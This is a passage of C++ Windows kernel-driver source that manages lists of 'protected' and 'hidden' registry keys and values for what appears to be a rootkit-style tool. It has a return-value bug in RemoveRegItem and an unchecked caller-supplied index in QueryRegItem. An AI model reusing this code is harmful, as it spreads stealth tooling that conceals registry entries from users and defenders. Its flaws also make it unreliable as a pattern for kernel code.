				WCHAR* buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, len, DRIVER_TAG);

				// Not enough resources.
				if (!buffer)
					break;

				errno_t err = wcscpy_s(buffer, len / sizeof(WCHAR), item->KeyPath);

				if (err != 0) {
					ExFreePoolWithTag(buffer, DRIVER_TAG);
					break;
				}

				if (i > this->ProtectedItems.Keys.LastIndex)
					this->ProtectedItems.Keys.LastIndex = i;

				this->ProtectedItems.Keys.KeysPath[i] = buffer;
				this->ProtectedItems.Keys.KeysCount++;
				added = true;
				break;
			}
		break;
	}
	case RegHiddenKey:
	{
		for (ULONG i = 0; i < MAX_REG_ITEMS; i++)
			if (this->HiddenItems.Keys.KeysPath[i] == nullptr) {
				SIZE_T len = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
				WCHAR* buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, len, DRIVER_TAG);

				// Not enough resources.
				if (!buffer)
					break;

				errno_t err = wcscpy_s(buffer, len / sizeof(WCHAR), item->KeyPath);

				if (err != 0) {
					ExFreePoolWithTag(buffer, DRIVER_TAG);
					break;
				}

				if (i > this->HiddenItems.Keys.LastIndex)
					this->HiddenItems.Keys.LastIndex = i;

				this->HiddenItems.Keys.KeysPath[i] = buffer;
				this->HiddenItems.Keys.KeysCount++;
				added = true;
				break;
			}
		break;
	}
	case RegProtectedValue:
	{
		for (ULONG i = 0; i < MAX_REG_ITEMS; i++) {
			if (this->ProtectedItems.Values.ValuesPath[i] == nullptr) {
				SIZE_T keyLen = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
				WCHAR* keyPath = (WCHAR*)ExAllocatePoolWithTag(PagedPool, keyLen, DRIVER_TAG);

				if (!keyPath) {
					break;
				}

				SIZE_T valueNameLen = (wcslen(item->ValueName) + 1) * sizeof(WCHAR);
				WCHAR* valueName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, valueNameLen, DRIVER_TAG);

				if (!valueName) {
					ExFreePoolWithTag(keyPath, DRIVER_TAG);
					break;
				}

				errno_t err = wcscpy_s(keyPath, keyLen / sizeof(WCHAR), item->KeyPath);

				if (err != 0) {
					ExFreePoolWithTag(valueName, DRIVER_TAG);
					ExFreePoolWithTag(keyPath, DRIVER_TAG);
					break;
				}
				err = wcscpy_s(valueName, valueNameLen / sizeof(WCHAR), item->ValueName);

				if (err != 0) {
					ExFreePoolWithTag(valueName, DRIVER_TAG);
					ExFreePoolWithTag(keyPath, DRIVER_TAG);
					break;
				}

				if (i > this->ProtectedItems.Values.LastIndex)
					this->ProtectedItems.Values.LastIndex = i;

				this->ProtectedItems.Values.ValuesPath[i] = keyPath;
				this->ProtectedItems.Values.ValuesName[i] = valueName;
				this->ProtectedItems.Values.ValuesCount++;
				added = true;
				break;
			}
		}
		break;
	}

	case RegHiddenValue:
	{
		for (ULONG i = 0; i < MAX_REG_ITEMS; i++) {
			if (this->HiddenItems.Values.ValuesPath[i] == nullptr) {
				SIZE_T keyLen = (wcslen(item->KeyPath) + 1) * sizeof(WCHAR);
				WCHAR* keyPath = (WCHAR*)ExAllocatePoolWithTag(PagedPool, keyLen, DRIVER_TAG);

				// Not enough resources.
				if (!keyPath) {
					break;
				}

				SIZE_T valueNameLen = (wcslen(item->ValueName) + 1) * sizeof(WCHAR);
				WCHAR* valueName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, valueNameLen, DRIVER_TAG);

				if (!valueName) {
					ExFreePoolWithTag(keyPath, DRIVER_TAG);
					break;
				}

				errno_t err = wcscpy_s(keyPath, keyLen / sizeof(WCHAR), item->KeyPath);

				if (err != 0) {
					ExFreePoolWithTag(valueName, DRIVER_TAG);
					ExFreePoolWithTag(keyPath, DRIVER_TAG);
					break;
				}
				err = wcscpy_s(valueName, valueNameLen / sizeof(WCHAR), item->ValueName);

				if (err != 0) {
					ExFreePoolWithTag(valueName, DRIVER_TAG);
					ExFreePoolWithTag(keyPath, DRIVER_TAG);
					break;
				}

				if (i > this->HiddenItems.Values.LastIndex)
					this->HiddenItems.Values.LastIndex = i;

				this->HiddenItems.Values.ValuesPath[i] = keyPath;
				this->HiddenItems.Values.ValuesName[i] = valueName;
				this->HiddenItems.Values.ValuesCount++;
				added = true;
				break;
			}
		}

		break;
	}
	}

	return added;
}

/*
* Description:
* RemoveRegItem is responsible for remove a registry item from the list of protected registry items.
*
* Parameters:
* @item	  [RegItem*] -- Registry item to remove.
*
* Returns:
* @status [bool]	 -- Whether successfully removed or not.
*/
bool RegistryUtils::RemoveRegItem(RegItem* item) {
	bool removed = false;
	ULONG newLastIndex = 0;
	AutoLock locker(this->Lock);

	switch (item->Type) {
	case RegProtectedKey:
	{
		for (ULONG i = 0; i <= this->ProtectedItems.Keys.LastIndex; i++) {
			if (this->ProtectedItems.Keys.KeysPath[i]) {
				if (_wcsicmp(this->ProtectedItems.Keys.KeysPath[i], item->KeyPath) == 0) {
					ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);

					if (i == this->ProtectedItems.Keys.LastIndex)
						this->ProtectedItems.Keys.LastIndex = newLastIndex;

					this->ProtectedItems.Keys.KeysPath[i] = nullptr;
					this->ProtectedItems.Keys.KeysCount--;
					removed = true;
					break;
				}
				else
					newLastIndex = i;
			}
		}
		break;
	}
	case RegHiddenKey:
	{
		for (ULONG i = 0; i <= this->HiddenItems.Keys.LastIndex; i++) {
			if (this->HiddenItems.Keys.KeysPath[i]) {
				if (_wcsicmp(this->HiddenItems.Keys.KeysPath[i], item->KeyPath) == 0) {
					ExFreePoolWithTag(this->HiddenItems.Keys.KeysPath[i], DRIVER_TAG);

					if (i == this->HiddenItems.Keys.LastIndex)
						this->HiddenItems.Keys.LastIndex = newLastIndex;
					this->HiddenItems.Keys.KeysPath[i] = nullptr;
					this->HiddenItems.Keys.KeysCount--;
					removed = true;
					break;
				}
				else
					newLastIndex = i;
			}
		}
		break;
	}
	case RegProtectedValue:
	{
		for (ULONG i = 0; i <= this->ProtectedItems.Values.LastIndex; i++) {
			if (this->ProtectedItems.Values.ValuesPath[i] && this->ProtectedItems.Values.ValuesName[i]) {
				if (_wcsicmp(this->ProtectedItems.Values.ValuesPath[i], item->KeyPath) == 0 &&
					_wcsicmp(this->ProtectedItems.Values.ValuesName[i], item->ValueName) == 0) {
					ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
					ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
					this->ProtectedItems.Values.ValuesPath[i] = nullptr;
					this->ProtectedItems.Values.ValuesName[i] = nullptr;

					if (i == this->ProtectedItems.Values.LastIndex)
						this->ProtectedItems.Values.LastIndex = newLastIndex;
					this->ProtectedItems.Values.ValuesCount--;
					removed = false;
					break;
				}
				else
					newLastIndex = i;
			}
		}
		break;
	}
	case RegHiddenValue:
	{
		for (ULONG i = 0; i <= this->HiddenItems.Values.LastIndex; i++) {
			if (this->HiddenItems.Values.ValuesPath[i]) {
				if (_wcsicmp(this->HiddenItems.Values.ValuesPath[i], item->KeyPath) == 0 &&
					_wcsicmp(this->HiddenItems.Values.ValuesName[i], item->ValueName) == 0) {
					ExFreePoolWithTag(this->HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
					ExFreePoolWithTag(this->HiddenItems.Values.ValuesName[i], DRIVER_TAG);
					this->HiddenItems.Values.ValuesPath[i] = nullptr;
					this->HiddenItems.Values.ValuesName[i] = nullptr;

					if (i == this->HiddenItems.Values.LastIndex)
						this->HiddenItems.Values.LastIndex = newLastIndex;

					this->HiddenItems.Values.ValuesCount--;
					removed = true;
					break;
				}
				else
					newLastIndex = i;
			}
		}
		break;
	}
	}

	return removed;
}

/*
* Description:
* ClearRegItem is responsible for clearing an array of registry items.
*
* Parameters:
* @regType [RegItemType] -- Type of the registry item to clear.
*
* Returns:
* There is no return value.
*/
void RegistryUtils::ClearRegItem(RegItemType regType) {
	AutoLock locker(this->Lock);

	switch (regType) {
	case RegProtectedKey:
	{
		for (ULONG i = 0; i <= this->ProtectedItems.Keys.LastIndex; i++) {
			if (this->ProtectedItems.Keys.KeysPath[i]) {
				ExFreePoolWithTag(this->ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
				this->ProtectedItems.Keys.KeysPath[i] = nullptr;
			}
		}

		this->ProtectedItems.Keys.KeysCount = 0;
		this->ProtectedItems.Keys.LastIndex = 0;
		break;
	}
	case RegHiddenKey:
	{
		for (ULONG i = 0; i <= this->HiddenItems.Keys.LastIndex; i++) {
			if (this->HiddenItems.Keys.KeysPath[i]) {
				ExFreePoolWithTag(this->HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
				this->HiddenItems.Keys.KeysPath[i] = nullptr;
			}
		}

		this->HiddenItems.Keys.LastIndex = 0;
		this->HiddenItems.Keys.KeysCount = 0;
		break;
	}
	case RegProtectedValue:
	{
		for (ULONG i = 0; i <= this->ProtectedItems.Values.LastIndex; i++) {
			if (this->ProtectedItems.Values.ValuesPath[i]) {
				ExFreePoolWithTag(this->ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
				this->ProtectedItems.Values.ValuesPath[i] = nullptr;
			}

			if (this->ProtectedItems.Values.ValuesName[i]) {
				ExFreePoolWithTag(this->ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
				this->ProtectedItems.Values.ValuesName[i] = nullptr;
			}
		}

		this->ProtectedItems.Values.LastIndex = 0;
		this->ProtectedItems.Values.ValuesCount = 0;
		break;
	}
	case RegHiddenValue:
	{
		for (ULONG i = 0; i <= this->HiddenItems.Values.LastIndex; i++) {
			if (this->HiddenItems.Values.ValuesPath[i]) {
				ExFreePoolWithTag(this->HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
				this->HiddenItems.Values.ValuesPath[i] = nullptr;
			}

			if (this->HiddenItems.Values.ValuesName[i]) {
				ExFreePoolWithTag(this->HiddenItems.Values.ValuesName[i], DRIVER_TAG);
				this->HiddenItems.Values.ValuesName[i] = nullptr;
			}
		}

		this->HiddenItems.Values.LastIndex = 0;
		this->HiddenItems.Values.ValuesCount = 0;
		break;
	}
	}
}

/*
* Description:
* ClearRegItems is responsible for clearing all registry items arrays.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void RegistryUtils::ClearRegItems() {
	ClearRegItem(RegProtectedKey);
	ClearRegItem(RegHiddenKey);
	ClearRegItem(RegProtectedValue);
	ClearRegItem(RegHiddenValue);
}

/*
* Description:
* QueryRegItem is responsible for getting a registry item from a registry item array.
*
* Parameters:
* @item	  [RegItem*] -- Registry item to get.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully got or not.
*/
NTSTATUS RegistryUtils::QueryRegItem(RegItem* item) {
	bool isFirstElement;
	errno_t err = 0;
	NTSTATUS status = STATUS_SUCCESS;
	AutoLock locker(this->Lock);

	isFirstElement = item->RegItemsIndex == 0;

	if (item->Type == RegProtectedKey) {
		if (this->ProtectedItems.Keys.KeysCount > 0) {
			err = wcscpy_s(item->KeyPath, this->ProtectedItems.Keys.KeysPath[item->RegItemsIndex]);

			if (err != 0) {
				status = STATUS_INVALID_USER_BUFFER;
				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
			}
		}
	}
	else if (item->Type == RegHiddenKey) {
		if (this->HiddenItems.Keys.KeysCount > 0) {
			err = wcscpy_s(item->KeyPath, this->HiddenItems.Keys.KeysPath[item->RegItemsIndex]);

			if (err != 0) {
				status = STATUS_INVALID_USER_BUFFER;
				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
			}
		}
	}
	else if (item->Type == RegProtectedValue) {
		if (this->ProtectedItems.Values.ValuesCount > 0) {
			err = wcscpy_s(item->KeyPath, this->ProtectedItems.Values.ValuesPath[item->RegItemsIndex]);

			if (err != 0) {
				status = STATUS_INVALID_USER_BUFFER;
				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
			}

			err = wcscpy_s(item->ValueName, this->ProtectedItems.Values.ValuesName[item->RegItemsIndex]);

			if (err != 0) {
				status = STATUS_INVALID_USER_BUFFER;
				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
			}
		}
	}
	else if (item->Type == RegHiddenValue) {
		if (this->HiddenItems.Values.ValuesCount > 0) {
			err = wcscpy_s(item->KeyPath, this->HiddenItems.Values.ValuesPath[item->RegItemsIndex]);

			if (err != 0) {
				status = STATUS_INVALID_USER_BUFFER;
				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
			}

			err = wcscpy_s(item->ValueName, this->HiddenItems.Values.ValuesName[item->RegItemsIndex]);

			if (err != 0) {
				status = STATUS_INVALID_USER_BUFFER;
				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
			}
		}
	}

	if (isFirstElement) {
		switch (item->Type) {
		case RegProtectedKey:
			item->RegItemsIndex = this->ProtectedItems.Keys.KeysCount;
			break;
		case RegHiddenKey:
			item->RegItemsIndex = this->HiddenItems.Keys.KeysCount;
			break;
		case RegProtectedValue:
			item->RegItemsIndex = this->ProtectedItems.Values.ValuesCount;
			break;
		case RegHiddenValue:
			item->RegItemsIndex = this->HiddenItems.Values.ValuesCount;
			break;
		}
	}

	return status;
}